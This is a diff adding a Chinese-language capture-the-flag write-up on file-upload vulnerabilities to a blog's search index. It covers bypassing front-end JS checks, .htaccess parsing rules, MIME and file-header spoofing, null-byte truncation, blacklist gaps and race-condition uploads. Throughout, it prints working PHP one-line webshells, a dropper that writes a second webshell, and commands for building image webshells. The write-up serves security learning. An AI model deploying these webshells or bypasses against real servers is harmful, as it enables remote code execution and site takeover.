@@ -31,4 +31,214 @@
         <tag>信息收集</tag>
       </tags>
   </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2024/082211796.html</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval(&#x27;code_str&#x27;);?&gt;        #php代码块 system(&#x27;whoami&#x27;)</span><br><span class="line">&lt;?php system(&#x27;command&#x27;)?&gt;        #直接传命令就行，whoami</span><br><span class="line">&lt;?php assert(&#x27;assertion&#x27;)?&gt;      #断延，也可以理解为代码块，只适用于php5以下，php7需要用eval</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>eg：</p>
+<?php eval($_GET[1]);?>
+
+<p>?1&#x3D;system(whoami);                #注意结尾带分号，非则不识别</p>
+<p>&#x3D;<?php eval(system(whoami););?></p>
+<p>蚁剑用的是eval木马</p>
+<h2 id="1-JavaScript-绕过"><a href="#1-JavaScript-绕过" class="headerlink" title="[1-JavaScript 绕过]"></a><strong>[1-JavaScript 绕过]</strong></h2><p>经过测试发现靶场只能传图片，一句话木马传不上去。对于JS一共有三种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.禁用JS</span><br><span class="line">2.bp改包</span><br><span class="line">3.js调试</span><br><span class="line">4.使用BP修改返回包（拓展）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_REQUEST[1]) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-禁用JS"><a href="#1-禁用JS" class="headerlink" title="1.禁用JS"></a>1.禁用JS</h3><p>右键检查，找到设置，找到禁用JS，关掉</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151107765.png" alt="image-20240815110753677"></p>
+<p>这个时候前端验证就无法检查我们上传的是不是图片了，再次上传一句话木马shell.php，然后蚁剑连接或者直接输</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/shell.php?1=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-bp改包"><a href="#2-bp改包" class="headerlink" title="2.bp改包"></a>2.bp改包</h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151111331.png" alt="image-20240815111131288"></p>
+<p>相当于在bp中狸猫换太子，绕过浏览器检测并给服务器传一句话木马。</p>
+<p>首先将shell.php改为shell.png上传，用bp抓包，</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151118472.png" alt="image-20240815111802445"></p>
+<p>将filename的png改为php,在发送即可，此时木马上传成功，</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151122494.png" alt="image-20240815112204461"></p>
+<h3 id="3-js调试"><a href="#3-js调试" class="headerlink" title="3.js调试"></a>3.js调试</h3><p>右键，检查然后找到调试器，空白index，刷新以下出现内容，在第40行下一个断点（whitelist后边，报错之前），目的是在报错之前可以修改验证</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151131628.png" alt="image-20240815113134589"></p>
+<p>之后上传shell.php，可以看到浏览器暂停了</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151132335.png" alt="image-20240815113247270"></p>
+<p>此时有两种方法可以调试js，一种是直接修改whitelist内容，改为php</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151138335.png" alt="image-20240815113815280"></p>
+<p>修改成功后把断点释放掉，即可上传成功。</p>
+<p>这种用谷歌进行，火狐修改不了。</p>
+<p>第二种是用控制台进行调试，同样下一个断点（弹窗前）</p>
+<p>上传shell.php,卡住之后来到控制台，输入whitelist，会返回白名单</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151145998.png" alt="image-20240815114514939"></p>
+<p>之后自己加一个php后缀，告诉他php也是合法的</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151149819.png" alt="image-20240815114936786"></p>
+<p>之后释放掉断点，即可成功上传。</p>
+<h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>一：</p>
+<p>不使用debug调试的时候，如何局部修改JS</p>
+<h4 id="使用BP修改返回包内容"><a href="#使用BP修改返回包内容" class="headerlink" title="使用BP修改返回包内容"></a>使用BP修改返回包内容</h4><p>一.不上传木马，直接刷新页面用BP抓包，之后拦截响应包</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151229088.png" alt="image-20240815122912019"></p>
+<p>再点击发送，即可返回源码，在BP中直接修改加上php即可</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151230424.png" alt="image-20240815123052385"></p>
+<p>这种只适用于简单的网站。</p>
+<p>另一种方法是网站JS不是直接写在源码中的，而是引用的外部JS</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151232903.png" alt="image-20240815123243863"></p>
+<p>如何用BP拦截这种JS？</p>
+<p>直接拦截是拦截不住的，需要勾选。</p>
+<p>找到Options,再找到File extention（默认不拦截的）,修改，去掉JS，此时就可以拦截外部JS了</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151238156.png" alt="image-20240815123838093"></p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151238128.png" alt="image-20240815123857080"></p>
+<p>把JS删掉，之后再次拦截，即可然后按照上边的步骤用拦截执行，拦截响应包，这个时候就可以随便修改外部JS了，可以用来修改JS小游戏的分数。</p>
+<h2 id="2-自定义解析规则"><a href="#2-自定义解析规则" class="headerlink" title="[2-自定义解析规则]"></a><strong>[2-自定义解析规则]</strong></h2><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>查看源码，发现靶场没有过滤.htaccess</p>
+<p>准备⼀个解析规则： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的意思是添加一种类型，用png为后缀，当作<strong>application&#x2F;x-httpd-php</strong>来使用。这表示将 upload ⽬录下的所有 png 图⽚都当做 php 来解析，</p>
+<p>由下图可以看出apache服务器中的对应规则，这句是为什么能解析。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151611815.png" alt="image-20240815161133740"></p>
+<p>创建一个.htaccess文件，直接命名为.开头就行，直接上传，然后再上传⼀个 shell.png 的 webshell 即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[1]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接即可。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408151642722.png" alt="image-20240815164208627"></p>
+<p>ggctf{65ea8214bf2f6f83de9a159883d9ec5d}</p>
+<h2 id="3-MIME-绕过"><a href="#3-MIME-绕过" class="headerlink" title="[3-MIME 绕过]"></a><strong>[3-MIME 绕过]</strong></h2><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</p>
+<p>MIME的组成结构非常简单；由类型与子类型两个字符串中间用 ‘&#x2F;‘ 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types">常见 MIME 类型列表 - HTTP | MDN (mozilla.org)</a></p>
+<p>先看一下靶场源码</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152101225.png" alt="image-20240815210101156"></p>
+<p>检测是否有这四种类型，没有的话就会被拦截</p>
+<p>上传一个shell.png，可以按到Content-Type: image&#x2F;png</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152102173.png" alt="image-20240815210220143"></p>
+<p>此时网页是不会报错的，但是单独传一个图片后缀是没有用的，此时有两种方法，一种是上传图片，BP拦截后把文件后缀改为.php此时</p>
+<p>Content-Type: image&#x2F;png不变不会报错，可以成功。第二种是上传shell.php，然后修改Content-Type为image&#x2F;png即可。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152134710.png" alt="image-20240815213453677"></p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408152138732.png" alt="image-20240815213838704"></p>
+<p>之后蚁剑连接即可。</p>
+<h3 id="4-文件头绕过"><a href="#4-文件头绕过" class="headerlink" title="[4-文件头绕过]"></a><strong>[4-文件头绕过]</strong></h3><p>一个文件里面的内容到底是啥？用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p>
+<p>常见的文件头标志如下：</p>
+<p>JPEG (jpg)，文件头：<code>FFD8FF</code><br>PNG (png)，文件头：<code>89504E47</code><br>GIF (gif)，文件头：<code>47494638</code><br>HTML (html)，文件头：<code>68746D6C3E</code><br>ZIP Archive (zip)，文件头：<code>504B0304</code><br>RAR Archive (rar)，文件头：<code>52617221</code><br>Adobe Acrobat (pdf)，文件头：<code>255044462D312E</code><br>MS Word&#x2F;Excel (xls.or.doc)，文件头：<code>D0CF11E0</code></p>
+<p>靶场会检测文件头的类型，先检查了MIME类型，再检查了文件头</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221755491.png" alt="image-20240822175512434"></p>
+<p>这个时候就需要改木马的文件头。</p>
+<p>第一种方法在BP中改文件头，我自己试了一下没成功。可以看到一句话木马前不是png的文件头。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221806165.png" alt="image-20240822180621104"></p>
+<p>第二种是生成图片马。</p>
+<ul>
+<li>windows下 图马制作</li>
+</ul>
+<p>先准备一个正常的A.png图片，在准备一个shell.php一句话木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy A.png/b + shell.php/a info.png     #先图片后木马</span><br></pre></td></tr></table></figure>
+
+<p>此时就会生成一个info.png，上传这个，同时修改<strong>filename&#x3D;shell.php,MIME不变</strong>。</p>
+<ul>
+<li>Linux 下 图马制作</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash# 将 shell.php 内容追加到 pic.png</span><br><span class="line">cat shell.php &gt;&gt; pic.png</span><br><span class="line"></span><br><span class="line"># png + php 合成 png 图马</span><br><span class="line">cat pic.png shell.php &gt;&gt; shell.png</span><br><span class="line"></span><br><span class="line"># 直接 echo 追加</span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt;&gt; pic.png</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-嵌套绕过"><a href="#5-嵌套绕过" class="headerlink" title="[5-嵌套绕过]"></a><strong>[5-嵌套绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221832228.png" alt="image-20240822183202164"></p>
+<p>这段代码的意思是首先确定一个黑名单，第二行如果匹配到了这些后缀就把这些后缀删掉，<strong>str_ireplace</strong>中的i表示不区分大小写，只要有黑名单的后缀就删掉后缀。</p>
+<p>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.php  &gt;&gt;  shell.</span><br></pre></td></tr></table></figure>
+
+<p>这个时候利用代码缺陷绕过，写另一种后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.pphphp</span><br></pre></td></tr></table></figure>
+
+<p>这个时候检测的时候就会删除中间php,剩下一个php</p>
+<h3 id="6-大小写绕过"><a href="#6-大小写绕过" class="headerlink" title="[6-大小写绕过]"></a><strong>[6-大小写绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408221955018.png" alt="image-20240822195519974"></p>
+<p>这里和第五个靶场的区别一个是没有i检测大小写，另一个就是两个引号中间不是没有东西了，而是替换成了空格，也就是说第五题的方法行不通了，php等会被替换为空格导致网站无法解析成功，所以就需要大小写绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.PHP</span><br></pre></td></tr></table></figure>
+
+<p>这种方法在windows中可行，因为他不区分大小写，但是linux不行，因为linux区分大小写。</p>
+<h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="[7-GET 型 00 截断]"></a><strong>[7-GET 型 00 截断]</strong></h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节(\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>这种方法只适用于</p>
+<ul>
+<li>magic -quotes-gpc&#x3D; Off</li>
+<li>PHP版本小于5.3.4</li>
+</ul>
+<p>00截断常配合目录截断</p>
+<p>上传一个info.png，BP抓包，在目录upload后边加上x.php%00。%00在url解码中会被转成空，就会截断。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222014987.png" alt="image-20240822201421913"></p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222016626.png" alt="image-20240822201630559"></p>
+<p>之后上传，此时这个图片会不存在，因为半路被截断下来了，此时实际上上传的是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...upload/x.php%00info.php</span><br><span class="line">url解码后</span><br><span class="line">...upload/x.php\x00info.php    #已知\x00为空，此时浏览器读到\x00后就不会往下读了，也就是说就等于上传上了x.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="[8-POST 型 00 截断]"></a><strong>[8-POST 型 00 截断]</strong></h3><p>跟第七个靶场很像，区别是这个是POST型截断也是上传info.png，BP抓包</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222023765.png" alt="image-20240822202338693"></p>
+<p>此时跟GET型一样写上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./upload/x.php</span><br></pre></td></tr></table></figure>
+
+<p>但是直接这样放包的话会失败，因为windows 在GET的时候会自动进行解码，而POST不会自动解码，所以需要在BP中手动解码一下</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222026691.png" alt="image-20240822202644625"></p>
+<p>此时解码完%00就会成空字节，再上传即可。</p>
+<p>第二种方法是BP抓包后手动修改16进制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./upload/x.php </span><br></pre></td></tr></table></figure>
+
+<p>在x.php后加一个空格，而空格的16进制是20，在BP中手动修改为00即可。</p>
+<h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="[9-黑名单缺陷]"></a><strong>[9-黑名单缺陷]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222032747.png" alt="img"></p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222031475.png" alt="image-20240822203151434"></p>
+<p>源码中只过滤了四种，phtml&#x2F;pht都没过虑</p>
+<p>所以后缀直接改成info.pht即可</p>
+<h3 id="10-条件竞争上传"><a href="#10-条件竞争上传" class="headerlink" title="[10-条件竞争上传]"></a><strong>[10-条件竞争上传]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222034696.png" alt="img"></p>
+<p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p>
+<p>攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p>
+<p>不过竞争的马因为生存周期短的原因，所以和普通的 Webshell 不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小 Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的 Webshell 内容大体上如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222035580.png" alt="image-20240822203523472"></p>
+<p>看一下源代码的逻辑，首先上传路径是upload，再是白名单和文件名。</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222037834.png" alt="image-20240822203756748"></p>
+<p>但是下面这部分出现了问题，第一步他是先用**move_uploaded_file函数将文件先请到UPLOAD_PATH,不管是不是白名单后缀，接着第二步他再检测是否是白名单，如果是即可通过，如果不是第三步unlike 删除文件。</p>
+<p>这个时候会出现一个时间差，就是条件竞争，短时间内多线程大量请求（上传），这个时候就会有漏网之鱼，即CPU来不及清理到。</p>
+<p>之前用到的一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候可能就不适用了，因为他存活时间短，可能蚁剑刚连上就会断掉，这时候就会用到母马。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">母马 -&gt;解析 -&gt;释放子马</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>挑选天选之马（母马）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>表示当这个字符串被访问时，会将**<?php eval($_REQUEST[1]);?>**写入到xiao.php。</p>
+<p>2.需要条件竞争，大量快速上传木马到服务器</p>
+<p>3.母马需要被解析（访问）</p>
+<p>如果上传成功，但是不访问，就不会触发解析，不解析就没有任何作用</p>
+<p>4.访问母马释放出来的子马即可getshell</p>
+<p>那么怎么大量上传呢？需要用到BP的爆破技巧</p>
+<p>首先先将母马传上去（dama.php），传上去很快就被删除了，此时右键发送到intruder（测试器）</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222056636.png" alt="image-20240822205609521"></p>
+<p>选到positions，将BP自动选定的定位符clean，将包原封不动，然后点击payloads</p>
+<p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222057639.png" alt="image-20240822205751558"></p>
+<p>有效载荷类型选择没有负载（null），无限期重复，在options中有线程，改不改都行，点击上传，此时BP就会一直上传。</p>
+<p>这个时候访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.../upload/dama.php</span><br></pre></td></tr></table></figure>
+
+<p>抓包，发送到intruder，再次进行爆破，此时有两个条件竞争会同时进行，如果成功的话就会生成一个xiao.php</p>
+<p>也可以直接写个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">dama_url = &#x27;http://.../upload/dama.php&#x27;</span><br><span class="line">while(True):                                      #while死循环</span><br><span class="line">	r = requests.get(url=dama_url)</span><br></pre></td></tr></table></figure>
+
+<p>这是再访问…&#x2F;upload&#x2F;xiao.php就能成功。</p>
+<h3 id="11-二次渲染绕过"><a href="#11-二次渲染绕过" class="headerlink" title="[11-二次渲染绕过]"></a><strong>[11-二次渲染绕过]</strong></h3><p><img src="https://gitee.com/kd-stroke-king/lem0n-picgo/raw/master/master/202408222119993.png" alt="img"></p>
+<p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢？</p>
+<ol>
+<li><p>GIF<br>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p>
+</li>
+<li><p>PNG<br>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块（如果第一次失败了保存图片再渲染一次即可）</p>
+</li>
+<li><p>JPG<br>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</p>
+</li>
+</ol>
+<p>LOOK一下WP，不在赘述</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
